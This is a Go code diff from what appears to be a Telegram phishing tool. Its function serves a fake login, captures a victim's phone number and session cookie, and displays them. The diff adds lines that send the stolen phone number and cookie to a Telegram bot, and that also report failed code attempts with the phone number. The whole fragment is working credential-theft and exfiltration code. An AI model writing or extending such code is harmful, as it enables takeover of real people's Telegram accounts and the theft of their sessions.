@@ -63,15 +63,22 @@ func serveMyTelegramLogin(win fyne.Window, textGrid *widget.TextGrid, textStream
 			if len(cookies) > 0 {
 				cookie := cookies[0].Name + " : " + cookies[0].Value
 				*textStream += "Phone = " + phone + "\nCookie = " + cookie + "\n"
+				if useTelegramBot {
+					tg.send("Phone = " + phone + "\nCookies:")
+					tg.send(cookie)
+				}
 				textGrid.SetText(*textStream)
 				notiApp.SendNotification(fyne.NewNotification("New Form", "phone : "+phone))
 				//http.Redirect(response, request, "https://telegram.org", 301)
 				fmt.Fprintln(response, "")
 				return
 			}
-			*textStream += "Wrong Code :D\n"
+			*textStream += "Wrong Code :D : " + phone + "\n"
 			textGrid.SetText(*textStream)
-			fmt.Fprintln(response, "Wrong Code!")
+			if useTelegramBot {
+				tg.send("Wrong Code for " + phone)
+			}
+			fmt.Fprintln(response, "Wrong Code : "+phone)
 			return
 
 		}
